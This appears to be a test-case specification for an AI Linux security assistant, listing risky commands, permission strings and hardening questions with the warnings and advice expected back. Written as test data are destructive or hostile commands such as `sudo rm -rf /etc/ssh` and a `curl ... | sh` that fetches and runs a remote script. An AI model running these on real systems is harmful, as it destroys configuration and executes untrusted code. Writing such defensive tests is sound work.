# AI Linux Security Assistant - Test Cases

This document provides a list of test cases to validate the functionality of the AI Linux Security Assistant.

## 1. Command Analysis Test Cases

| ID | Input Command | Expected AI Focus |
|----|---------------|-------------------|
| C1 | `chmod 777 sensitive_file.txt` | Explain it grants full access to everyone; suggest `600` or `644`. |
| C2 | `sudo rm -rf /etc/ssh` | Identify extreme risk; deletion of critical config; advise against recursive rm on system folders. |
| C3 | `chown root:root /home/user/my_app` | Explain ownership change; risk of user being unable to access their own file. |
| C4 | `ufw allow 22` | Explain enabling SSH port; recommend limiting IP ranges for better security. |
| C5 | `ssh root@192.168.1.10` | Warn about direct root login risks; suggest using a standard user + sudo. |
| C6 | `passwd -d username` | Highlight the risk of deleting a password (making account passwordless). |
| C7 | `curl http://untrusted-site.com/script.sh | sh` | Warn against piping remote scripts directly to shell (Remote Code Execution risk). |

## 2. Permission Analyzer Test Cases

| ID | Input String | Expected Analysis |
|----|--------------|-------------------|
| P1 | `777` | Identify as "Critical Risk"; World-readable, writable, and executable. |
| P2 | `-rwxrwxrwx` | Same as P1; highlight that "others" have write/execute access. |
| P3 | `644` | Identify as "Standard/Safe"; Owner can read/write, others can only read. |
| P4 | `-rw-------` | Identify as "Highly Restrictive/Secure"; Only owner has access. |
| P5 | `755` | Identify as "Standard for Directories"; Others can list and enter but not modify. |
| P6 | `drwxr-xr-x` | Correctly identify as a directory with standard permissions. |
| P7 | `-rwsr-xr-x` | Identify the 's' (SUID bit); explain the security implications of SUID. |

## 3. System Hardening Test Cases

| ID | User Request | Expected Recommendations |
|----|--------------|--------------------------|
| H1 | "How to secure SSH?" | Recommendations for `PermitRootLogin no`, `PasswordAuthentication no`, and port changing. |
| H2 | "Recommend a firewall setup." | Instructions for `ufw` or `iptables`; default deny policy. |
| H3 | "How to handle updates?" | Suggesting `unattended-upgrades` for automatic security patches. |
| H4 | "Basic server hardening steps." | Comprehensive list: User management, SSH, Firewall, Fail2Ban, Log auditing. |
| H5 | "How to prevent brute force?" | Recommendation for `fail2ban` and disabling password auth. |

## 4. Error Handling & Edge Cases

| ID | Input | Expected Behavior |
|----|-------|-------------------|
| E1 | `invalid_command_123` | AI should explain it doesn't recognize the command but offers general advice. |
| E2 | `999` (Octal) | Permission analyzer should report an invalid octal range (0-7 only). |
| E3 | `abc-def-ghi` | Permission analyzer should report invalid symbolic format. |
| E4 | Empty input | App should show a warning "Please enter a command/permission string." |
